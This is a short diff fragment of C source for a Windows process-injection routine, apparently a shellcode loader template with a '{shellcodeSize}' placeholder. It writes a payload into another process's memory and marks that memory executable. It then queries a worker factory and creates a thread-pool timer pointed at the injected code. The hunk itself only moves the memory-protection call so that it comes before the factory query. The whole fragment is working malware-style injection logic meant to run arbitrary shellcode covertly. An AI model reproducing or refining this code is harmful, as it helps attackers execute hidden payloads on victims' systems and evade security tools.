@@ -193,12 +193,12 @@ HANDLE GetHandle( DWORD PID, LPWSTR HandleName, SIZE_T Access )
     Status     = WriteProcessMemory( hProcess, BaseAddress, shellcode, {shellcodeSize}, NULL );
     printf( "Wrote payload in successfully!\\n" );
 
+    // Make payload executable
+    Status      = VirtualProtectEx( hProcess, BaseAddress, RegionSize, PAGE_EXECUTE_READ, &OldProtect );
+
     // Get WorkerFactoryBasicInformation so we can obtain the StartParameter
     Status     = NtQueryInformationWorkerFactory( hFactory, WorkerFactoryBasicInformation, &FactoryInfo, sizeof(FactoryInfo), NULL );
     printf( "Queried Worker Factory information successfully!\\n" );
-
-    // Make payload executable
-    Status      = VirtualProtectEx( hProcess, BaseAddress, RegionSize, PAGE_EXECUTE_READ, &OldProtect );
 
     // Create a timer in our local process
     TpTimer     = (PFULL_TP_TIMER)CreateThreadpoolTimer( BaseAddress, NULL, NULL );
